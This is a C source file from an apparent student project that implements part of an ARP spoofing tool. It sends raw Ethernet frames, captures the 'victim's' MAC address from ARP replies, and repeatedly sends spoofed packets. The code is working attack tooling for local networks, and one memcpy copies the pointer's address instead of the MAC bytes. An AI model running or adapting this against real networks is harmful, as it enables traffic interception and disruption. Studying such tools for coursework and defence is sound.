/*
** EPITECH PROJECT, 2019
** NWP_myarpspoof_2018
** File description:
** spoofing
*/

#include "arpspoof.h"

int send_packet(data_t data, int fd, char *frame)
{
    unsigned char *sender_mac = get_mac_from_iface(data.iface);
    struct sockaddr_ll device;

    memset(&device, 0, sizeof(struct sockaddr_ll));
    if ((device.sll_ifindex = if_nametoindex(data.iface)) == 0)
        return (display_error("Failed to obtain index interface."), FAILURE);
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, &sender_mac, 6 * sizeof(unsigned char));
    device.sll_halen = 6;
    if (sendto(fd, frame, HDR_LEN, 0, (struct sockaddr *) &device, \
    sizeof(device)) < 0)
        return (display_error("Couldn't send"), FAILURE);
    free(sender_mac);
    return EXIT_SUCCESS;
}

static unsigned char *treat_packet(char *buf)
{
    eth_t *eth_rep = NULL;
    arp_t *arp_rep = NULL;
    unsigned char *res = malloc(6 * sizeof(unsigned char));

    if (!res)
        exit(FAILURE);
    eth_rep = (void *) buf;
    arp_rep = (void *) buf + sizeof(eth_t);
    if (eth_rep->h_proto == htons(ETH_P_ARP) && arp_rep->op_code == \
    htons(ARPOP_REPLY)) {
        printf("Found victim's MAC address: '");
        for (int i = 0; i < 5; i++)
            printf("%02x:", arp_rep->sender_mac[i]);
        printf("%02x'\n", arp_rep->sender_mac[5]);
        memcpy(res, arp_rep->sender_mac, 6 * sizeof(unsigned char));
    }
    return res;
}

unsigned char *recv_packet(int fd)
{
    fd_set set;
    struct timeval timeout;
    int retval;
    char buf[42];
    unsigned char *res = NULL;

    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    FD_ZERO(&set);
    FD_SET(fd, &set);
    if ((retval = select(FD_SETSIZE, &set, NULL, NULL, &timeout)) < 0)
        return (dprintf(2, "Select failed: %s", strerror(errno)), NULL);
    else if (retval == 0)
        return (display_error("Timeout"), NULL);
    memset(buf, 0, sizeof(buf));
    if (recv(fd, buf, sizeof(buf), 0) < 0)
        return (dprintf(2, "Error recvfrom: %s\n", strerror(errno)), NULL);
    else
        res = treat_packet(buf);
    return res;
}

int send_spoofed_packet(data_t data, int fd, char *frame)
{
    while (1) {
        printf("Spoofed packet send to '%s'\n", data.dest_ip);
        if (send_packet(data, fd, frame))
            return FAILURE;
        sleep(1);
    }
    return EXIT_SUCCESS;
}